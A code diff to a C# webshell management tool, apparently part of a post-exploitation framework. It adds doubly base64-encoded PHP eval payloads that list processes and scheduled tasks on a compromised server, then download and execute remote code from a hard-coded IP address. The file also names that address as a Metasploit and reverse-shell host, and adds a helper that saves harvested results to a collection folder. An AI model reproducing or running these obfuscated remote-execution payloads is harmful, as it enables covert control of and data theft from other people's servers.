@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Windows.Forms;
 
 namespace C2.Business.CastleBravo.WebShellTool
@@ -122,8 +123,8 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public static string TrojanHorsePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva1pEMUFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiT1RsZEtUc05DaVJqYjJSbFBXWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUmtLVHNOQ2tCbGRtRnNLR2Q2YVc1bWJHRjBaU2drWTI5a1pTa3BPdw&99=aHR0cDovLzEwMy40My4xNy45L2Flc3MuZ2lm&dir={1}&type=p&time={2};";
         public static string SystemInfoPayload = String.Empty;
-        public static string ProcessViewPayload = String.Empty;
-        public static string ScheduleTaskPayload = String.Empty;
+        public static string ProcessViewPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLSkdOdFpDQTlJSE4wY21semRISW9VRWhRWDA5VExDSjNhVzRpS1Q4aWRHRnphMnhwYzNRaU9pSndjeUF0WldZaU93MEthV1lvWlcxd2RIa29KRjlUUlZOVFNVOU9XeWQ1ZG5GQ0oxMHBLUTBLZXlSZlUwVlRVMGxQVGxzbmVYWnhRaWRkUFdacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NKb2RIUndPaTh2TVRBekxqUXpMakUzTGprdmQyc3ZZMjFrTG1kcFppSXBPMzBOQ2tCbGRtRnNLR2Q2YVc1bWJHRjBaU2drWDFORlUxTkpUMDViSjNsMmNVSW5YU2twT3c9PQ==";
+        public static string ScheduleTaskPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLSkdOdFpDQTlJSE4wY21semRISW9VRWhRWDA5VExDSjNhVzRpS1Q4aVUwTklWRUZUUzFNaU9pSmpjbTl1ZEdGaUlDMXNJanNOQ21sbUtHVnRjSFI1S0NSZlUwVlRVMGxQVGxzbmVYWnhRaWRkS1NrTkNuc2tYMU5GVTFOSlQwNWJKM2wyY1VJblhUMW1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2lhSFIwY0Rvdkx6RXdNeTQwTXk0eE55NDVMM2RyTDJOdFpDNW5hV1lpS1R0OURRcEFaWFpoYkNobmVtbHVabXhoZEdVb0pGOVRSVk5UU1U5T1d5ZDVkbkZDSjEwcEtUcz0=";
         public static string LocationPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=SkhWeWJDQTlJQ0pvZEhSd2N6b3ZMM2QzZHk1bmIyOW5iR1V1WTI5dExtaHJMMjFoY0hNaU93MEtKSFJsZUhRZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2tkWEpzS1RzTkNpUnRZWFJqYUNBOUlDSitLRnN3TFRrdVhTc3BKVEpES0Zzd0xUa3VYU3NwZmlJN0RRcHdjbVZuWDIxaGRHTm9LQ1J0WVhSamFDd2tkR1Y0ZEN3a2JTazdEUXBsWTJodklDSlJRVU5MVEROSlR6bFFQVDBpTGlSdFd6RmRMaUlzSWk0a2JWc3lYUzRpUFQxUlFVTkxURE5KVHpsUUlqcz0=";
         public static string MSFHost = "103.43.17.9:8889";
         public static string ReverseShellHost = "103.43.17.9:8889";
@@ -145,5 +146,30 @@ namespace C2.Business.CastleBravo.WebShellTool
                                                   "wFtP7Go4rUxNf3bm8jQBcLOe0LC7dNCR"
                                                   };
         public static string BDLocationAPI = "https://api.map.baidu.com/reverse_geocoding/v3/?ak={0}&output=json&coordtype=wgs84ll&location={1}";
+        public static string WriteResult(string result, string url, string type)
+        {
+            string time = DateTime.Now.ToString("yyyyMMDDHHmmss");           
+            try
+            {
+
+                Match m = new Regex("://(.*?)/").Match(url);
+                string fileName = m.Success ? string.Format("{0}_{1}", m.Groups[1].Value, time) : time;
+                fileName += ".txt";
+                string path = Path.Combine(Global.UserWorkspacePath, "后信息采集", type);
+                Directory.CreateDirectory(path);
+                string filePath = Path.Combine(path, fileName);
+                using (StreamWriter sw = new StreamWriter(filePath, false, System.Text.Encoding.UTF8))
+                {
+                    sw.WriteLine(result);
+                }
+                return filePath;
+
+            }
+            catch (Exception ex)
+            {
+                return ex.Message;
+            }
+        }
+
     }
 }
